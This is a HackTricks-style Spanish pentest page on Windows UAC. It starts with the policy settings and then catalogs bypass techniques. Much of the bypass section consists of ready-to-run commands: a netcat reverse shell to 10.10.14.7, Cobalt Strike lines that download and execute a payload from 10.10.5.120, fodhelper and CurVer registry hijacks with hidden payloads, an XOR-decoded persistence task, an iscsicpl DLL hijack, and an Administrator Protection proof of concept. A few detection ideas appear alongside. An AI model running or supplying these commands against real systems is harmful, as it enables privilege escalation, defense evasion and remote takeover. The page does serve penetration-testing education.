# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una feature que habilita un **consent prompt para actividades elevadas**. Las applications tienen distintos niveles de `integrity`, y un programa con un **nivel alto** puede realizar tareas que **podrían comprometer potencialmente el sistema**. Cuando UAC está habilitado, las applications y tasks siempre **se ejecutan bajo el security context de una cuenta no administradora** a menos que un administrador autorice explícitamente a estas applications/tasks a tener acceso de nivel administrador al sistema para ejecutarse. Es una feature de conveniencia que protege a los administradores de cambios no intencionados, pero no se considera una security boundary.

Para más info sobre integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Cuando UAC está presente, a un usuario administrador se le dan 2 tokens: una clave de usuario estándar, para realizar acciones normales como nivel regular, y otra con los privilegios de admin.

Esta [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) analiza en gran profundidad cómo funciona UAC e incluye el proceso de logon, la experiencia de usuario y la arquitectura de UAC. Los administradores pueden usar security policies para configurar cómo funciona UAC de forma específica para su organización a nivel local (usando secpol.msc), o configurarlo y distribuirlo mediante Group Policy Objects (GPO) en un entorno de dominio de Active Directory. Los distintos ajustes se analizan en detalle [aquí](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Hay 10 Group Policy settings que se pueden establecer para UAC. La siguiente tabla proporciona más detalle:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

Las **local security policies** ("secpol.msc" en la mayoría de los sistemas) están configuradas por defecto para **impedir que los usuarios no admin realicen instalaciones de software**. Esto significa que incluso si un usuario no admin puede descargar el installer de tu software, no podrá ejecutarlo sin una cuenta de admin.

### Registry Keys to Force UAC to Ask for Elevation

Como usuario estándar sin privilegios de admin, puedes asegurarte de que la cuenta "standard" sea **solicitada por UAC para introducir credenciales** cuando intente realizar ciertas acciones. Esta acción requeriría modificar ciertas **registry keys**, para lo cual necesitas permisos de admin, a menos que exista un **UAC bypass**, o que el atacante ya haya iniciado sesión como admin.

Incluso si el usuario está en el grupo **Administrators**, estos cambios obligan al usuario a **volver a introducir las credenciales de su cuenta** para realizar acciones administrativas.

**La única desventaja es que este enfoque necesita que UAC esté deshabilitado para funcionar, lo cual es poco probable que ocurra en entornos de producción.**

Las registry keys y entradas que debes cambiar son las siguientes (con sus valores por defecto entre paréntesis):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Esto también se puede hacer manualmente a través de la herramienta Local Security Policy. Una vez cambiado, las operaciones administrativas le piden al usuario que vuelva a introducir sus credenciales.

### Note

**User Account Control no es una security boundary.** Por lo tanto, los usuarios estándar no pueden salir de sus cuentas y obtener derechos de administrador sin un local privilege escalation exploit.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Privilegios UAC

- Internet Explorer Protected Mode usa comprobaciones de integridad para impedir que procesos de alto nivel de integridad (como los navegadores web) accedan a datos de bajo nivel de integridad (como la carpeta de archivos temporales de Internet). Esto se hace ejecutando el navegador con un token de baja integridad. Cuando el navegador intenta acceder a datos almacenados en la zona de baja integridad, el sistema operativo comprueba el nivel de integridad del proceso y permite el acceso en consecuencia. Esta función ayuda a evitar que los ataques de ejecución remota de código obtengan acceso a datos sensibles en el sistema.
- Cuando un usuario inicia sesión en Windows, el sistema crea un access token que contiene una lista de los privilegios del usuario. Los privilegios se definen como la combinación de los derechos y capacidades de un usuario. El token también contiene una lista de las credenciales del usuario, que son credenciales que se usan para autenticar al usuario frente al equipo y frente a recursos de la red.

### Autoadminlogon

Para configurar Windows para que inicie sesión automáticamente con un usuario específico al arrancar, establece la **`AutoAdminLogon` registry key**. Esto es útil para entornos de kiosk o con fines de prueba. Úsalo solo en sistemas seguros, ya que expone la contraseña en el registry.

Establece las siguientes claves usando el Registry Editor o `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Para revertir al comportamiento normal de inicio de sesión, establece `AutoAdminLogon` en 0.

## UAC bypass

> [!TIP]
> Ten en cuenta que si tienes acceso gráfico a la víctima, UAC bypass es directo, ya que simplemente puedes hacer clic en "Yes" cuando aparezca el aviso de UAC

El UAC bypass es necesario en la siguiente situación: **UAC está activado, tu proceso se ejecuta en un contexto de integridad media, y tu usuario pertenece al grupo de administrators**.

Es importante mencionar que es **mucho más difícil bypass the UAC si está en el nivel de seguridad más alto (Always) que si está en cualquiera de los otros niveles (Default).**

### UAC disabled

Si UAC ya está deshabilitado (`ConsentPromptBehaviorAdmin` es **`0`**) puedes **ejecutar una reverse shell con privilegios de admin** (high integrity level) usando algo como:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Very** Basic UAC "bypass" (full file system access)

Si tienes una shell con un usuario que está dentro del grupo Administrators, puedes **montar el recurso compartido C$** vía SMB (file system) local en un nuevo disco y tendrás **access to everything inside the file system** (incluso la carpeta home de Administrator).

> [!WARNING]
> **Parece que este truco ya no funciona**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Bypass de UAC con cobalt strike

Las técnicas de Cobalt Strike solo funcionarán si UAC no está configurado en su nivel máximo de seguridad
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** y **Metasploit** también tienen varios módulos para **bypass** de **UAC**.

### KRBUACBypass

Documentación y herramienta en [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) que es una **compilation** de varios UAC bypass exploits. Ten en cuenta que tendrás que **compile UACME usando visual studio o msbuild**. La compilación creará varios ejecutables (como `Source\Akagi\outout\x64\Debug\Akagi.exe`) , necesitarás saber **cuál necesitas.**\
Debes **tener cuidado** porque algunos bypasses **promtp** a otros programas que **alertarán** al **usuario** de que algo está ocurriendo.

UACME tiene la **build version** a partir de la cual cada técnica empezó a funcionar. Puedes buscar una técnica que afecte a tus versiones:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
También, usando [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page obtienes la versión de Windows `1607` a partir de las build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

El binario de confianza `fodhelper.exe` se auto-elevated en Windows modernos. Cuando se inicia, consulta la ruta del registry por usuario de abajo sin validar el verbo `DelegateExecute`. Plantar un command ahí permite que un proceso Medium Integrity (el usuario está en Administrators) cree un proceso High Integrity sin un UAC prompt.

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Pasos de PowerShell (configura tu payload, luego activa)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notas:
- Funciona cuando el usuario actual es miembro de Administrators y el nivel de UAC es el predeterminado/lenient (no Always Notify con restricciones extra).
- Usa la ruta `sysnative` para iniciar un PowerShell de 64 bits desde un proceso de 32 bits en Windows de 64 bits.
- El payload puede ser cualquier comando (PowerShell, cmd, o una ruta a un EXE). Evita prompts de UI para stealth.

#### Variante de hijack de CurVer/extension (solo HKCU)

Muestras recientes que abusan de `fodhelper.exe` evitan `DelegateExecute` y en su lugar **redirigen el ProgID `ms-settings`** mediante el valor `CurVer` por usuario. El binario autoelevado aún resuelve el handler bajo `HKCU`, así que no se necesita un token de admin para plantar las keys:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Una vez elevado, el malware comúnmente **deshabilita futuros prompts** configurando `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` en `0`, luego realiza evasión adicional de defensas (por ejemplo, `Add-MpPreference -ExclusionPath C:\ProgramData`) y recrea la persistencia para ejecutarse con alta integridad. Una tarea típica de persistencia almacena un **script de PowerShell cifrado con XOR** en disco y lo decodifica/ejecuta en memoria cada hora:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Esta variante todavía limpia el dropper y deja solo los payloads staged, lo que hace que la detección dependa de monitorear el **`CurVer` hijack**, la manipulación de `ConsentPromptBehaviorAdmin`, la creación de exclusiones de Defender o tareas programadas que descifran PowerShell en memoria.

#### Más UAC bypass

**Todas** las técnicas usadas aquí para bypass de AUC **requieren** una **shell interactiva completa** con la víctima (una shell común de nc.exe no es suficiente).

Puedes obtener una sesión usando **meterpreter**. Migra a un **proceso** que tenga el valor **Session** igual a **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ debería funcionar)

### UAC Bypass con GUI

Si tienes acceso a una **GUI**, puedes simplemente aceptar el prompt de UAC cuando aparezca; realmente no necesitas hacer bypass. Así que obtener acceso a una GUI te permitirá bypass de la UAC.

Además, si obtienes una sesión GUI que alguien estaba usando (potencialmente vía RDP), hay **algunas herramientas que se ejecutarán como administrador** desde donde podrías **ejecutar** un **cmd** por ejemplo **como admin** directamente sin que UAC vuelva a pedir confirmación, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Esto puede ser un poco más **stealthy**.

### Noisy brute-force UAC bypass

Si no te importa ser ruidoso, siempre podrías **ejecutar algo como** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) que **pide elevar permisos hasta que el usuario lo acepta**.

### Tu propio bypass - Metodología básica de UAC bypass

Si miras **UACME**, notarás que **la mayoría de los UAC bypass abusan de una vulnerabilidad de Dll Hijacking** (principalmente escribiendo la dll maliciosa en _C:\Windows\System32_). [Lee esto para aprender cómo encontrar una vulnerabilidad de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Encuentra un binario que se **autoelevate** (verifica que, cuando se ejecuta, corre con un nivel de integridad alto).
2. Con procmon, encuentra eventos "**NAME NOT FOUND**" que puedan ser vulnerables a **DLL Hijacking**.
3. Probablemente necesitarás **escribir** la DLL dentro de algunas **rutas protegidas** (como C:\Windows\System32) donde no tienes permisos de escritura. Puedes evitar esto usando:
1. **wusa.exe**: Windows 7,8 y 8.1. Permite extraer el contenido de un archivo CAB dentro de rutas protegidas (porque esta herramienta se ejecuta desde un nivel de integridad alto).
2. **IFileOperation**: Windows 10.
4. Prepara un **script** para copiar tu DLL dentro de la ruta protegida y ejecutar el binario vulnerable y autoelevado.

### Otra técnica de UAC bypass

Consiste en observar si un binario **autoElevated** intenta **leer** del **registry** el **nombre/ruta** de un **binario** o **comando** que se va a **ejecutar** (esto es más interesante si el binario busca esta información dentro de **HKCU**).

### UAC bypass vía `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

El binario de 32 bits `C:\Windows\SysWOW64\iscsicpl.exe` es un binario **auto-elevated** que puede ser abusado para cargar `iscsiexe.dll` mediante search order. Si puedes colocar una `iscsiexe.dll` maliciosa dentro de una carpeta **escribible por el usuario** y luego modificar el `PATH` del usuario actual (por ejemplo vía `HKCU\Environment\Path`) para que esa carpeta sea buscada, Windows puede cargar la DLL del atacante dentro del proceso elevado `iscsicpl.exe` **sin mostrar un prompt de UAC**.

Notas prácticas:
- Esto es útil cuando el usuario actual está en **Administrators** pero ejecutándose en **Medium Integrity** debido a UAC.
- La copia de **SysWOW64** es la relevante para este bypass. Trata la copia de **System32** como un binario separado y valida su comportamiento de forma independiente.
- La primitiva es una combinación de **auto-elevation** y **DLL search-order hijacking**, así que el mismo flujo de ProcMon usado para otros UAC bypass es útil para validar la carga de la DLL faltante.

Flujo mínimo:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ideas de detección:
- Alertar sobre `reg add` / escrituras en el registro a `HKCU\Environment\Path` inmediatamente seguidas por la ejecución de `C:\Windows\SysWOW64\iscsicpl.exe`.
- Buscar `iscsiexe.dll` en ubicaciones **controladas por el usuario** como `%TEMP%` o `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlacionar inicios de `iscsicpl.exe` con procesos hijo inesperados o cargas de DLL desde fuera de los directorios normales de Windows.

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” usa shadow-admin tokens con mapas por sesión `\Sessions\0\DosDevices/<LUID>`. El directorio se crea bajo demanda por `SeGetTokenDeviceMap` en la primera resolución de `\??`. Si el atacante suplanta el shadow-admin token solo en **SecurityIdentification**, el directorio se crea con el atacante como **owner** (hereda `CREATOR OWNER`), permitiendo enlaces de letras de unidad que tienen prioridad sobre `\GLOBAL??`.

**Pasos:**

1. Desde una sesión con pocos privilegios, llamar a `RAiProcessRunOnce` para iniciar un `runonce.exe` shadow-admin sin prompt.
2. Duplicar su primary token a un token de **identification** e impersonarlo mientras se abre `\??` para forzar la creación de `\Sessions\0\DosDevices/<LUID>` bajo propiedad del atacante.
3. Crear allí un symlink `C:` apuntando a almacenamiento controlado por el atacante; los accesos posteriores al filesystem en esa sesión resolverán `C:` hacia la ruta del atacante, permitiendo DLL/file hijack sin prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
